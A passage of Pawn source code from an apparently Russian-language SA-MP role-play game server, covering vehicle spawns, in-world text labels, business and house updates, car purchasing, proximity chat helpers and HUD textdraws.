CreateVehicle(486,694.3974,897.6894,-38.8131,95.0132,1,1,100); //
CreateVehicle(486,692.9650,903.2133,-38.9314,113.8649,1,1,100); //
CreateVehicle(486,689.8938,907.7513,-39.3230,131.7550,1,1,100); //
CreateVehicle(486,691.5724,878.0186,-39.3436,79.6954,1,1,100); //
CreateVehicle(486,686.1878,911.6445,-39.7643,136.7734,1,1,100); //
nouncar[1] = CreateVehicle(486,683.3029,915.0306,-40.0777,126.9964,1,1,100); //
mechanic[0] = CreateVehicle(525,1629.7094,-1085.0973,23.7753,270.0503,0,3,60); //
CreateVehicle(525,1629.7123,-1089.4210,23.7844,270.0524,0,3,60); //
CreateVehicle(525,1629.7159,-1093.9387,23.7930,270.0576,0,3,60); //
CreateVehicle(525,1629.7205,-1098.4546,23.7902,270.0486,0,3,60); //
CreateVehicle(525,1629.7235,-1102.9243,23.7945,270.0497,0,3,60); //
CreateVehicle(525,1629.7274,-1107.3188,23.7944,270.0497,0,3,60); //
CreateVehicle(525,1649.7496,-1107.1049,23.7793,90.0452,0,3,60); //
CreateVehicle(525,1649.7493,-1102.6351,23.8040,90.0494,0,3,60); //
CreateVehicle(525,1649.7476,-1098.1918,23.8241,90.0530,0,3,60); //
CreateVehicle(525,1649.7323,-1093.7013,23.7806,90.0574,0,3,60); //
CreateVehicle(525,1649.7312,-1089.2357,23.8047,90.0540,0,3,60); //
CreateVehicle(525,1649.7279,-1084.6726,23.8176,90.0576,0,3,60); //
CreateVehicle(525,-2035.7030,180.5191,28.7231,179.2320,53,53,60); // мех сф
CreateVehicle(525,-2031.2955,180.4253,28.7187,179.0717,53,53,60); //
CreateVehicle(525,-2026.2128,180.2942,28.7171,178.1030,53,53,60); //
CreateVehicle(525,-2021.2292,180.2187,28.5351,178.5780,53,53,60); //
CreateVehicle(525,2839.4414,1375.7900,10.6361,179.1998,53,53,60); // мех лв
CreateVehicle(525,2842.5813,1375.7646,10.6591,179.4990,53,53,60); //
CreateVehicle(525,2845.9016,1375.8579,10.6764,180.1641,53,53,60); //
CreateVehicle(525,2849.0630,1375.9318,10.6804,178.9334,53,53,60); //
mechanic[1] = CreateVehicle(525,1649.7219,-1080.2258,23.8096,90.0556,0,3,60); //
/***********************************FBI CARS***************************************/
fbicar[0] = CreateVehicle(487,-1964.6989,-1026.6689,59.6170, 300, 0, 0, 100); // Транспорт 0
fbicar[1] = CreateVehicle(560,-1941.3000,-1087.3830,30.5830, 0, 0, 0, 100); // Транспорт 1
fbicar[2] = CreateVehicle(560,-1949.5,-1087.3828,30.5830, 0, 0, 0, 100); // Транспорт 2
fbicar[3] = CreateVehicle(541,-1945.3929,-1084.0959,30.4729, 0, 0, 0, 100); // Транспорт 3
fbicar[4] = CreateVehicle(490,-1951.0,-1074.1710,31.2409, 0, 0, 0, 100); // Транспорт 4
fbicar[5] = CreateVehicle(490,-1939.6064,-1074.1708,31.2409, 0, 0, 0, 100); // Транспорт 5
fbicar[6] = CreateVehicle(415,-1945.3929,-1068.0489,31.2229, 0, 0, 0, 100); // Транспорт 6
fbicar[7] = CreateVehicle(411,-1938.4129,-1052.2340,31.9720, 20, 0, 0, 100); // Транспорт 7
fbicar[8] = CreateVehicle(411,-1938.8189,-1044.5639,31.9720, 19.9951, 0, 0, 100); // Транспорт 8
/**************************************************************************/
farm1car[0] = CreateVehicle(478,-368.0372,-1437.5983,25.7161,87.7302,6,5,10000); // farm1 veh
farm1car[1] = CreateVehicle(532,-378.4078,-1452.9828,26.7023,341.3694,6,5,10000); // farm1 vehsffd
/**************************************************************************/
CreatePickup(1239, 23, 2792.0034,-2456.1975,13.6326);
CreateDynamic3DTextLabel("Сброс камней",0xFFFFFFFF, 695.5369,843.2320,-27.2055,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
CreateDynamic3DTextLabel("Сброс камней",0xFFFFFFFF, 684.0453,822.3344,-27.2389,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
CreateDynamic3DTextLabel("Шлагбаум: {33CCFF}H",0xFFFFFFFF, 2238.5742,2454.0466,10.8203,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
CreateDynamic3DTextLabel("Шлагбаум: {33CCFF}H",0xFFFFFFFF, 1545.0767,-1626.9976,13.3828,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
CreateDynamic3DTextLabel("Шлагбаум: {33CCFF}H",0xFFFFFFFF, -1701.8092,683.8960,24.8906,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
CreateDynamic3DTextLabel("Шлагбаум: {33CCFF}H",0xFFFFFFFF, -1572.5665,662.4639,7.1875,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
CreateDynamic3DTextLabel("Шлагбаум: {33CCFF}H",0xFFFFFFFF, -2057.2344,-97.6487,35.1718,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
CreateDynamic3DTextLabel("Введите: /plist",COLOR_LIGHTGREEN, 2792.0034,-2456.1975,13.6326,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
CreateDynamic3DTextLabel("Введите: /flist",COLOR_LIGHTGREEN, 248.7008,1445.8474,10.5919,20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
CreateDynamic3DTextLabel("« Порт Лос Сантоса »\n\nТовары 24/7 - 26$\nПродукты для клуба - 24$\nБП (материалы) - 20$\nПродукты для закусочной - 23$",COLOR_LIGHTGREEN, 2773.7861,-2455.7412,17.5893+0.6,50.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, -1, -1);
for(new i = 0; i < 8; i++) MatsFact[i] = CreatePickup(1239, 2, MatsFactory[i][0],MatsFactory[i][1],MatsFactory[i][2]);
format(string, 60, "Металла на складе: {33AA33}%i / 100000{ffffff} кг", Metal);
tPickup[2] = Create3DTextLabel(string,0xFFFFFFFF,143.5620,1871.6250,1002.0203,50.0,0,0);
format(string, 50, "Топлива в скважине: {FF9900}%i{ffffff} литров", MafiaInfo[3][mFuel][0]);
tPickup[20] = Create3DTextLabel(string,0xFFFFFFFF,433.6584,1576.0164,15.5696,50.0,0,0);
format(string, 50, "Топлива в скважине: {FF9900}%i{ffffff} литров", MafiaInfo[3][mFuel][1]);
tPickup[21] = Create3DTextLabel(string,0xFFFFFFFF,600.5330,1510.1200,11.2981,50.0,0,0);
format(string, 50, "Топлива в скважине: {FF9900}%i{ffffff} литров", MafiaInfo[3][mFuel][2]);
tPickup[22] = Create3DTextLabel(string,0xFFFFFFFF,578.1840,1434.5988,15.1006,50.0,0,0);
format(string, 50, "Топлива в скважине: {FF9900}%i{ffffff} литров", MafiaInfo[3][mFuel][3]);
tPickup[23] = Create3DTextLabel(string,0xFFFFFFFF,627.7645,1364.2751,16.3216,50.0,0,0);
format(string, 50, "Топлива в скважине: {FF9900}%i{ffffff} литров", MafiaInfo[3][mFuel][4]);
tPickup[24] = Create3DTextLabel(string,0xFFFFFFFF,353.3320,1312.0857,15.5642,50.0,0,0);
format(string, 50, "Топлива на заводе: {FF9900}%i{ffffff} литров", FuelBank);
tPickup[25] = Create3DTextLabel(string,0xFFFFFFFF,252.1836,1361.4313,17.7510,50.0,0,0);
tPickup[26] = Create3DTextLabel(string,0xFFFFFFFF,252.2269,1385.9399,17.7510,50.0,0,0);
tPickup[27] = Create3DTextLabel(string,0xFFFFFFFF,252.3859,1410.4368,17.7510,50.0,0,0);
tPickup[28] = Create3DTextLabel(string,0xFFFFFFFF,252.5156,1435.3085,17.7510,50.0,0,0);
format(string, 50, "Руды на складе: {FF9900}%i{ffffff} кг", Mineral[0]);
tPickup[7] = Create3DTextLabel(string,0xFFFFFFFF,587.8453,939.7278,850.9623,50.0,1,1);
tPickup[8] = Create3DTextLabel(string,0xFFFFFFFF,689.3366,846.2860,-26.5030,50.0,0,1);
tPickup[9] = Create3DTextLabel(string,0xFFFFFFFF,368.9874,858.2366,23.7669,50.0,0,1);
tPickup[10] = Create3DTextLabel(string,0xFFFFFFFF,676.9088,826.9437,-26.5030,50.0,0,1);
format(string, 50, "Урожайя на складе: %d/100000т", FarmInfo[fSeeds]);
tPickup[29] = Create3DTextLabel(string,0xFFFFFFFF,-366.7770,-1420.2347,27.3391,50.0,0,1);
return true;
}
//==============================================================================
stock UpdateBizz(idx)
{
new string[128];
if(BizzInfo[idx][bType] != 2 && BizzInfo[idx][bType] != 7)
{
if(!strcmp(BizzInfo[idx][bOwner],"None",true))
{
format(string, 90, "Бизнес продается!\nНазвание: %s", BizzInfo[idx][bName]);
Update3DTextLabelText(LABELBIZZ[idx],COLOR_LIGHTGREEN,string);
}
else
{
format(string, 90, "Владелец: %s\nНазвание: %s", BizzInfo[idx][bOwner], BizzInfo[idx][bName]);
Update3DTextLabelText(LABELBIZZ[idx],COLOR_LIGHTGREEN,string);
}
}
else if(BizzInfo[idx][bType] == 2)
{
if(!strcmp(BizzInfo[idx][bOwner],"None",true))
{
format(string, 90, "Заправка продается!\nНазвание: %s\nЦена за 1 литр - %i долларов", BizzInfo[idx][bName], BizzInfo[idx][bTill]);
Update3DTextLabelText(LABELBIZZ[idx],COLOR_LIGHTGREEN,string);
}
else
{
format(string, 90, "Владелец заправки: %s\nНазвание: %s\nЦена за 1 литр - %i долларов",  BizzInfo[idx][bOwner], BizzInfo[idx][bName], BizzInfo[idx][bTill]);
Update3DTextLabelText(LABELBIZZ[idx],COLOR_LIGHTGREEN,string);
}
}
else if(BizzInfo[idx][bType] == 7)
{
if(!strcmp(BizzInfo[idx][bOwner],"None",true))
{
format(string, 128, "CTO продается!\nНазвание: %s\nЦена за 1 запчасть - %i долларов\nЧто бы тюниться, введите /tuning", BizzInfo[idx][bName], BizzInfo[idx][bTill]);
Update3DTextLabelText(LABELBIZZ[idx],COLOR_LIGHTGREEN,string);
}
else
{
format(string, 128, "Владелец СТО: %s\nНазвание: %s\nЦена за 1 запчасть - %i долларов\nЧто бы тюниться, введите /tuning",  BizzInfo[idx][bOwner], BizzInfo[TOTALBIZZ][bName], BizzInfo[idx][bTill]);
Update3DTextLabelText(LABELBIZZ[idx],COLOR_LIGHTGREEN,string);
}
}
return true;
}
//==============================================================================
stock UpdateHouse(idx)
{
DestroyDynamicMapIcon(HouseInfo[idx][hMIcon]);
DestroyPickup(HouseInfo[idx][hPickup]);
//DestroyPickup(HouseInfo[idx][hPickupExit]);
if(!strcmp(HouseInfo[idx][hOwner],"None",true))
{
HouseInfo[idx][hMIcon] = CreateDynamicMapIcon(HouseInfo[idx][hEntrx], HouseInfo[idx][hEntry], HouseInfo[idx][hEntrz], 31, 0,-1,-1,-1,200.0);
HouseInfo[idx][hPickup] = CreatePickup(1273, 1, HouseInfo[idx][hEntrx], HouseInfo[idx][hEntry], HouseInfo[idx][hEntrz]);
}
else
{
HouseInfo[idx][hMIcon] = CreateDynamicMapIcon(HouseInfo[idx][hEntrx], HouseInfo[idx][hEntry], HouseInfo[idx][hEntrz], 32, 0,-1,-1,-1,200.0);
HouseInfo[idx][hPickup] = CreatePickup(1272, 1, HouseInfo[idx][hEntrx], HouseInfo[idx][hEntry], HouseInfo[idx][hEntrz]);
}
//HouseInfo[idx][hPickupExit] = CreatePickup(19134, 1, HouseInfo[idx][hExitx], HouseInfo[idx][hExity], HouseInfo[idx][hExitz], HouseInfo[idx][hVirtual]);
return true;
}
//==============================================================================
stock UpdateDacha(idx)
{
DestroyDynamicMapIcon(HouseInfo[idx][dMIcon]);
DestroyDynamicPickup(HouseInfo[idx][dPickup]);
//DestroyPickup(HouseInfo[idx][hPickupExit]);
if(!strcmp(HouseInfo[idx][dOwner],"None_None",true))
{
HouseInfo[idx][dMIcon] = CreateDynamicMapIcon(HouseInfo[idx][dEntrx], HouseInfo[idx][dEntry], HouseInfo[idx][dEntrz], 31, 0,-1,-1,-1,200.0);
HouseInfo[idx][dPickup] = CreateDynamicPickup(1273, 1, HouseInfo[idx][dEntrx], HouseInfo[idx][dEntry], HouseInfo[idx][dEntrz]);
}
else
{
HouseInfo[idx][dMIcon] = CreateDynamicMapIcon(HouseInfo[idx][dEntrx], HouseInfo[idx][dEntry], HouseInfo[idx][dEntrz], 32, 0,-1,-1,-1,200.0);
HouseInfo[idx][dPickup] = CreateDynamicPickup(1272, 1, HouseInfo[idx][dEntrx], HouseInfo[idx][dEntry], HouseInfo[idx][dEntrz]);
}
//HouseInfo[idx][hPickupExit] = CreatePickup(19134, 1, HouseInfo[idx][hExitx], HouseInfo[idx][hExity], HouseInfo[idx][hExitz], HouseInfo[idx][hVirtual]);
return true;
}
//==============================================================================
stock SaveVehicle(playerid)
{
if(GetPlayerHouse(playerid))
{
PlayerInfo[playerid][cFuel] = Fuel[GetPVarInt(playerid, "PlayerCar")];
}
return true;
}
//==============================================================================
stock BuyCar(playerid)
{
if(GetPlayerHouse(playerid) == 1)
{
new Float:x, Float:y, Float:z, Float:fa,cost[MAX_PLAYERS],model[MAX_PLAYERS];
switch(InShop[playerid])
{
case 1: cost[playerid]=GetInflationPrice(carsC[pPressed[playerid]][1]), model[playerid]=carsC[pPressed[playerid]][0], x=542.2341, y=-1291.1302, z=17.2422, fa=0.9819;
case 2: cost[playerid]=GetInflationPrice(carsB[pPressed[playerid]][1]), model[playerid]=carsB[pPressed[playerid]][0], x=-1957.9304, y=305.4497, z=35.4688, fa=179.9544;
case 3: cost[playerid]=GetInflationPrice(carsA[pPressed[playerid]][1]), model[playerid]=carsA[pPressed[playerid]][0], x=2200.7061, y=1392.0594, z=10.8203, fa=180.9670;
}
switch(InShop[playerid])
{
case 1: PlayerInfo[playerid][cClass] = 3;
case 2: PlayerInfo[playerid][cClass] = 2;
case 3: PlayerInfo[playerid][cClass] = 1;
}
if(PlayerInfo[playerid][pBank] < cost[playerid]) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoney);
InShop[playerid] = 0;
TogglePlayerControllable(playerid,true);
Exchequer+=cost[playerid];
format(query, 64, "UPDATE "TABLE_MAYOR" SET exchequer = %d", Exchequer);
PlayerInfo[playerid][pBank] -= cost[playerid];
TextDrawHideForPlayer(playerid,VehNazv[playerid]);
TextDrawHideForPlayer(playerid,VehCost[playerid]);
TextDrawHideForPlayer(playerid,PressA);
TextDrawHideForPlayer(playerid,PressD);
TextDrawHideForPlayer(playerid,PressH);
TextDrawHideForPlayer(playerid,PressC);
TextDrawHideForPlayer(playerid,PressB);
TextDrawHideForPlayer(playerid,VehBox);
SetPlayerPos(playerid,x,y,z);
SetPlayerFacingAngle(playerid,fa);
SetPlayerInterior(playerid,0);
SetPlayerVirtualWorld(playerid,0);
SetCameraBehindPlayer(playerid);
PlayerInfo[playerid][cModel]=model[playerid];
PlayerInfo[playerid][cCost]=cost[playerid];
PlayerInfo[playerid][cLock]=1;
PlayerInfo[playerid][cFuel] = 200;
PlayerInfo[playerid][cColor][0]=colors[playerid][0];
PlayerInfo[playerid][cColor][1]=colors[playerid][1];
SendMes(playerid, TEAM_BLUE_COLOR, "Вы купили транспорт: %s за %d долларов",VehicleNameS[GetVehicleModel(veh[playerid])-400],PlayerInfo[playerid][cCost]);
SendClientMessage(playerid,TEAM_BLUE_COLOR,"Ваш транспорт доставлен к вашему дому");
DestroyVehicle(veh[playerid]);
if(GetPVarInt(playerid,"PlayerCar") > 0)
{
DestroyVehicle(GetPVarInt(playerid,"PlayerCar"));
DeletePVar(playerid,"PlayerCar");
}
pPressed[playerid] = 0;
LoadMyCar(playerid);
}
return true;
}
//==============================================================================
stock BuyCloseCar(playerid)
{
new Float:x, Float:y, Float:z, Float:fa;
switch(InShop[playerid])
{
case 1: x=542.2341, y=-1291.1302, z=17.2422, fa=0.9819;
case 2: x=-1957.9304, y=305.4497, z=35.4688, fa=179.9544;
case 3: x=2200.7061, y=1392.0594, z=10.8203, fa=180.9670;
}
DestroyVehicle(veh[playerid]);
InShop[playerid] = 0;
TogglePlayerControllable(playerid,true);
TextDrawHideForPlayer(playerid,VehNazv[playerid]);
TextDrawHideForPlayer(playerid,VehCost[playerid]);
TextDrawHideForPlayer(playerid,PressA);
TextDrawHideForPlayer(playerid,PressD);
TextDrawHideForPlayer(playerid,PressH);
TextDrawHideForPlayer(playerid,PressC);
TextDrawHideForPlayer(playerid,PressB);
TextDrawHideForPlayer(playerid,VehBox);
SetPlayerPos(playerid,x,y,z);
SetPlayerFacingAngle(playerid,fa);
SetPlayerInterior(playerid,0);
SetPlayerVirtualWorld(playerid,0);
SetCameraBehindPlayer(playerid);
pPressed[playerid] = 0;
return true;
}
//==============================================================================
stock LoadMyCar(playerid)
{
if(GetPlayerHouse(playerid) == 0) return true;
new h = GetPVarInt(playerid, "PlayerHouse");
if(PlayerInfo[playerid][cModel] > 611 || PlayerInfo[playerid][cModel] < 400)
     {
         PlayerInfo[playerid][cModel] = 462;
         SendClientMessage(playerid,COLOR_REDD,"К вашему дому доставлен скутер!");
     }
new carid = CreateVehicle(PlayerInfo[playerid][cModel], HouseInfo[h][hCarx],HouseInfo[h][hCary],HouseInfo[h][hCarz],HouseInfo[h][hCarfa], PlayerInfo[playerid][cColor][0], PlayerInfo[playerid][cColor][1], 90000);
SetPVarInt(playerid,"PlayerCar",carid);
CarDoors(carid, PlayerInfo[playerid][cLock]);
Fuel[carid] = PlayerInfo[playerid][cFuel];
SetVehicleHealth(carid, 1000);
Engine[carid] = false;
Lights[carid] = false;
SetVehicleNumberPlate(carid,""Namemode"");
switch(PlayerInfo[playerid][cLock])
{
case 0: IsLocked[carid] = false;
case 1: IsLocked[carid] = true;
}
if(PlayerInfo[playerid][cVehcoms][0]!=0) AddVehicleComponent(carid, PlayerInfo[playerid][cVehcoms][0]);
if(PlayerInfo[playerid][cVehcoms][1]!=0) AddVehicleComponent(carid, PlayerInfo[playerid][cVehcoms][1]);
if(PlayerInfo[playerid][cVehcoms][2]!=0) AddVehicleComponent(carid, PlayerInfo[playerid][cVehcoms][2]);
if(PlayerInfo[playerid][cVehcoms][3]!=0) AddVehicleComponent(carid, PlayerInfo[playerid][cVehcoms][3]);
if(PlayerInfo[playerid][cVehcoms][4]!=0) AddVehicleComponent(carid, PlayerInfo[playerid][cVehcoms][4]);
if(PlayerInfo[playerid][cVehcoms][5]!=0) AddVehicleComponent(carid, PlayerInfo[playerid][cVehcoms][5]);
if(PlayerInfo[playerid][cVehcoms][6]!=0) AddVehicleComponent(carid, PlayerInfo[playerid][cVehcoms][6]);
if(PlayerInfo[playerid][cVehcoms][7]!=0) AddVehicleComponent(carid, PlayerInfo[playerid][cVehcoms][7]);
if(PlayerInfo[playerid][cVehcoms][8]!=0) AddVehicleComponent(carid, PlayerInfo[playerid][cVehcoms][8]);
if(PlayerInfo[playerid][cVehcoms][9]!=0) AddVehicleComponent(carid, PlayerInfo[playerid][cVehcoms][9]);
if(PlayerInfo[playerid][cVehcoms][10]!=0) AddVehicleComponent(carid, PlayerInfo[playerid][cVehcoms][10]);
if(PlayerInfo[playerid][cVehcoms][11]!=0) AddVehicleComponent(carid, PlayerInfo[playerid][cVehcoms][11]);
if(PlayerInfo[playerid][cVehcoms][12]!=0) AddVehicleComponent(carid, PlayerInfo[playerid][cVehcoms][12]);
if(PlayerInfo[playerid][cVehcoms][13]!=0) AddVehicleComponent(carid,PlayerInfo[playerid][cVehcoms][13]);
if(PlayerInfo[playerid][cPaintjob]!=3) ChangeVehiclePaintjob(carid, PlayerInfo[playerid][cPaintjob]);
return true;
}
//==============================================================================
stock SendAdminMessage(color, str[])
{
foreach(new i:Player)
{
if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
if(PlayerInfo[i][pAdmin] > 0 && SendAdmin[i]) SendClientMessage(i, color, str);
}
return true;
}
//==============================================================================
stock SendFMes(family, color, str[])
{
foreach(new i:Player)
{
if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
if(PlayerInfo[i][pMember] == family && SendFamily[i]) SendClientMessage(i, color, str);
}
return true;
}
//==============================================================================
stock SendDMes(color, str[])
{
foreach(new i:Player)
{
if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
if(SendFamily[i])
{
if(PlayerInfo[i][pMember] == F_ARMY || PlayerInfo[i][pMember] == F_HOSPITAL || PlayerInfo[i][pMember] == F_MAYOR || IsACop(i)) SendClientMessage(i, color, str);
}
}
return true;
}
//==============================================================================
stock SendNTodayMes(color, str[])
{
foreach(new i:Player)
{
if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
if(PlayerInfo[i][pNews] == NEWS_UNITED) SendClientMessage(i, color, str);
}
return true;
}
//==============================================================================
stock Float:PointAngle(playerid, Float:xa, Float:ya, Float:xb, Float:yb)
{
new Float:carangle;
new Float:xc, Float:yc;
new Float:angle;
xc = floatabs(floatsub(xa,xb));
yc = floatabs(floatsub(ya,yb));
if (yc == 0.0 || xc == 0.0)
{
if(yc == 0 && xc > 0) angle = 0.0;
else if(yc == 0 && xc < 0) angle = 180.0;
else if(yc > 0 && xc == 0) angle = 90.0;
else if(yc < 0 && xc == 0) angle = 270.0;
else if(yc == 0 && xc == 0) angle = 0.0;
}
else
{
angle = atan(xc/yc);
if(xb > xa && yb <= ya) angle += 90.0;
else if(xb <= xa && yb < ya) angle = floatsub(90.0, angle);
else if(xb < xa && yb >= ya) angle -= 90.0;
else if(xb >= xa && yb > ya) angle = floatsub(270.0, angle);
}
GetVehicleZAngle(GetPlayerVehicleID(playerid), carangle);
return floatadd(angle, -carangle);
}
//==============================================================================
stock GetClosestPlayer(p1)
{
new x,Float:dis,Float:dis2,player;
player = -1;
dis = 99999.99;
for (x=0;x<MAX_PLAYERS;x++)
{
if(!IsPlayerConnected(x)) continue; //
if(x != p1)
{
dis2 = GetDistanceBetweenPlayers(x,p1);
if(dis2 < dis && dis2 != -1.00)
{
dis = dis2;
player = x;
}
}
}
return player;
}
//==============================================================================
stock ProxDetectorNew(playerid,Float:Radi=10.0,color,text[])
{
new Float:pos[3];
GetPlayerPos(playerid,pos[0],pos[1],pos[2]);
for(new i;i<MAX_PLAYERS;i++)
{
if(!IsPlayerConnected(i)) continue; //
if(IsPlayerInRangeOfPoint(i,Radi,pos[0],pos[1],pos[2]))
{
if(GetPlayerVirtualWorld(i) == GetPlayerVirtualWorld(playerid) && GetPlayerInterior(playerid) == GetPlayerInterior(i))SendClientMessage(i,color,text);
}
}
}
//==============================================================================
stock ProxDetectorX(Float:x,Float:y,Float:z,Float:Radi=10.0,color,text[])
{
//new Float:pos[3];
for(new i;i<MAX_PLAYERS;i++)
{
if(IsPlayerConnected(i))
{
if(IsPlayerInRangeOfPoint(i,Radi,x,y,z))
{
SendClientMessage(i,color,text);
}
}
}
}
//==============================================================================
stock ProxDetector(Float:radi, playerid, str[],col1,col2,col3,col4,col5)
{
new Float:posx, Float:posy, Float:posz;
new Float:oldposx, Float:oldposy, Float:oldposz;
new Float:tempposx, Float:tempposy, Float:tempposz;
GetPlayerPos(playerid, oldposx, oldposy, oldposz);
foreach(new i:Player)
{
if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
if(!BigEar[i])
{
GetPlayerPos(i, posx, posy, posz);
tempposx = (oldposx -posx);
tempposy = (oldposy -posy);
tempposz = (oldposz -posz);
if (((tempposx < radi/16) && (tempposx > -radi/16)) && ((tempposy < radi/16) && (tempposy > -radi/16)) && ((tempposz < radi/16) && (tempposz > -radi/16))) SendClientMessage(i, col1, str);
else if (((tempposx < radi/8) && (tempposx > -radi/8)) && ((tempposy < radi/8) && (tempposy > -radi/8)) && ((tempposz < radi/8) && (tempposz > -radi/8))) SendClientMessage(i, col2, str);
else if (((tempposx < radi/4) && (tempposx > -radi/4)) && ((tempposy < radi/4) && (tempposy > -radi/4)) && ((tempposz < radi/4) && (tempposz > -radi/4))) SendClientMessage(i, col3, str);
else if (((tempposx < radi/2) && (tempposx > -radi/2)) && ((tempposy < radi/2) && (tempposy > -radi/2)) && ((tempposz < radi/2) && (tempposz > -radi/2))) SendClientMessage(i, col4, str);
else if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi))) SendClientMessage(i, col5, str);
}
else SendClientMessage(i, col1, str);
}
return true;
}
//==============================================================================
stock IsPlayerInRangeOfPlayer(Float:radi, playerid, targetid)
{
if(IsPlayerConnected(playerid) && IsPlayerConnected(targetid) &&
!IsPlayerNPC(playerid) && !IsPlayerNPC(targetid))
{
new Float:posx, Float:posy, Float:posz;
GetPlayerPos(targetid, posx, posy, posz);
if(IsPlayerInRangeOfPoint(playerid, radi, posx, posy, posz)) return true;

}
return false;
}
//==============================================================================
stock SpeedVehicle(playerid)
{
new Float:ST[4];
if(IsPlayerInAnyVehicle(playerid)) GetVehicleVelocity(GetPlayerVehicleID(playerid),ST[0],ST[1],ST[2]);
else GetPlayerVelocity(playerid,ST[0],ST[1],ST[2]);
ST[3] = floatsqroot(floatpower(floatabs(ST[0]), 2.0) + floatpower(floatabs(ST[1]), 2.0) + floatpower(floatabs(ST[2]), 2.0)) * 213.3;
return floatround(ST[3]);
}
//==============================================================================
stock convert(time, &min, &sec, &msec)
{
new Float:fTime = floatdiv(time, 60000);
min = floatround(fTime, floatround_tozero);
sec = floatround(floatmul(fTime - min, 60), floatround_tozero);
msec = floatround(floatmul(floatmul(fTime - min, 60) - sec, 1000), floatround_tozero);
}
//==============================================================================
stock CreateTextDraws(playerid)
{

FuelShow[playerid] = TextDrawCreate(329.0+120.2, 387.0+10, "_");
TextDrawBackgroundColor(FuelShow[playerid], COLOR_BLACK);
TextDrawLetterSize(FuelShow[playerid],0.399999,1.710000);
TextDrawFont(FuelShow[playerid], 2);
TextDrawColor(FuelShow[playerid], COLOR_WHITE);
TextDrawSetOutline(FuelShow[playerid], 1);
TextDrawSetProportional(FuelShow[playerid],1);
TextDrawSetShadow(FuelShow[playerid],1);

SpeedShow[playerid] = TextDrawCreate(418.000000+120.2,366.000000+10,"0km/h");
TextDrawBackgroundColor(SpeedShow[playerid],COLOR_BLACK);
TextDrawLetterSize(SpeedShow[playerid],0.399999,1.710000);
TextDrawFont(SpeedShow[playerid],2);
TextDrawColor(SpeedShow[playerid],COLOR_WHITE);
TextDrawSetOutline(SpeedShow[playerid],1);
TextDrawSetProportional(SpeedShow[playerid],1);
TextDrawSetShadow(SpeedShow[playerid],1);

HealthShow[playerid] = TextDrawCreate(329.000000+120.2,366.000000+10,"0%");
TextDrawBackgroundColor(HealthShow[playerid],COLOR_BLACK);
TextDrawLetterSize(HealthShow[playerid],0.399999,1.710000);
TextDrawFont(HealthShow[playerid],2);
TextDrawColor(HealthShow[playerid],COLOR_WHITE);
TextDrawSetOutline(HealthShow[playerid],1);
TextDrawSetProportional(HealthShow[playerid],1);
TextDrawSetShadow(HealthShow[playerid],1);

StatusShow[playerid] = TextDrawCreate(377.0+120.2, 391.0+10, "_");
TextDrawBackgroundColor(StatusShow[playerid], COLOR_BLACK);
TextDrawLetterSize(StatusShow[playerid],0.259999,1.010000);
TextDrawFont(StatusShow[playerid], 2);
TextDrawColor(StatusShow[playerid], COLOR_WHITE);
TextDrawSetOutline(StatusShow[playerid], 1);
TextDrawSetProportional(StatusShow[playerid],1);
TextDrawSetShadow(StatusShow[playerid],1);

Speed2Show[playerid] = TextDrawCreate(461.0+120.2, 391.0+10, "_");
TextDrawBackgroundColor(Speed2Show[playerid], COLOR_BLACK);
TextDrawLetterSize(Speed2Show[playerid],0.239999,1.010000);
TextDrawFont(Speed2Show[playerid], 2);
TextDrawColor(Speed2Show[playerid], COLOR_WHITE);
TextDrawSetOutline(Speed2Show[playerid], 1);
TextDrawSetProportional(Speed2Show[playerid],1);
TextDrawSetShadow(Speed2Show[playerid],1);

EngineShow[playerid] = TextDrawCreate(432.0+120.2, 391.0+10, "_");
TextDrawBackgroundColor(EngineShow[playerid], COLOR_BLACK);
TextDrawLetterSize(EngineShow[playerid],0.259999,1.010000);
TextDrawFont(EngineShow[playerid], 2);
TextDrawColor(EngineShow[playerid], COLOR_WHITE);
TextDrawSetOutline(EngineShow[playerid], 1);
TextDrawSetProportional(EngineShow[playerid],1);
TextDrawSetShadow(EngineShow[playerid],1);

VehNazv[playerid] = TextDrawCreate(450.0,205.0, " ");
TextDrawBackgroundColor(VehNazv[playerid], COLOR_BLACK);
TextDrawLetterSize(VehNazv[playerid],0.399999,1.710000);
TextDrawFont(VehNazv[playerid], 2);
TextDrawColor(VehNazv[playerid], COLOR_WHITE);
TextDrawSetOutline(VehNazv[playerid], 1);
TextDrawSetProportional(VehNazv[playerid],1);
TextDrawSetShadow(VehNazv[playerid],1);

VehCost[playerid] = TextDrawCreate(450.0,225.0, " ");
TextDrawBackgroundColor(VehCost[playerid], COLOR_BLACK);
TextDrawLetterSize(VehCost[playerid],0.399999,1.710000);
TextDrawFont(VehCost[playerid], 2);
TextDrawColor(VehCost[playerid], COLOR_WHITE);
TextDrawSetOutline(VehCost[playerid], 1);
TextDrawSetProportional(VehCost[playerid],1);
TextDrawSetShadow(VehCost[playerid],1);
return true;
}
//==============================================================================
stock RemoveBuild(playerid)
{
// CASINO
CasinoDuty[playerid] = 0;
RemoveBuildingForPlayer(playerid, 985, 2497.4063, 2777.0703, 11.5313, 0.25);
RemoveBuildingForPlayer(playerid, 986, 2497.4063, 2769.1094, 11.5313, 0.25);
RemoveBuildingForPlayer(playerid, 3672, 1889.6563, -2666.0078, 18.8828, 0.25);
RemoveBuildingForPlayer(playerid, 3672, 1822.7344, -2666.0078, 18.8828, 0.25);
RemoveBuildingForPlayer(playerid, 3672, 1682.7266, -2666.0078, 18.8828, 0.25);
